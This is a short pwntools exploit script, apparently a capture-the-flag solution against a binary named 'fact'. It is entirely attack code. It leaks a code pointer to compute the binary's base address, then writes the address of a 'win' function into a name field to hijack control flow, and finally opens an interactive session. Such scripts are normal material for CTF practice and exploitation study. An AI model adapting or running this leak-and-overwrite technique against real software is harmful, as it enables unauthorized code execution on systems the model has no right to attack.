from pwn import *
 
context.log_level = "debug"
context.arch = "amd64"
context.os = "linux"
context.terminal = ["/usr/bin/tmux", "sp", "-h"]

f_remote = True if "remote" in sys.argv else False
f_gdb = True if "gdb" in sys.argv else False

vuln_path = "./fact"
libc_path = "./libc.so.6"

elf, rop = ELF(vuln_path), ROP(vuln_path)
#libc, roplibc = ELF(libc_path), ROP(libc_path)

if not f_remote:
    io = process([vuln_path])
    #io = process([ld_path, vuln_path], env={"LD_PRELOAD": libc_path})
else:
    io = remote("", 9999)


def ddebug(b=""):
    if not f_gdb:
        return

    gdb.attach(io, gdbscript=b)
    pause()

payload = b""


io.sendlineafter("Please type in your new name:\n", b"1")

io.sendlineafter("Exit\n", b"b")
fact_base = u64(io.recvuntil("\x55")[-6:].ljust(8, b"\x00")) - 0x1587
log.success("base:-----> " + hex(fact_base))

win = fact_base + 0x16a3
io.sendlineafter("Exit\n", b"a")
io.sendafter("Please type in your new name:\n", p64(win))
data=io.recvall()
log.success(data)


io.interactive()
"""
0xb587 - 0xa000 = 0x1587
"""
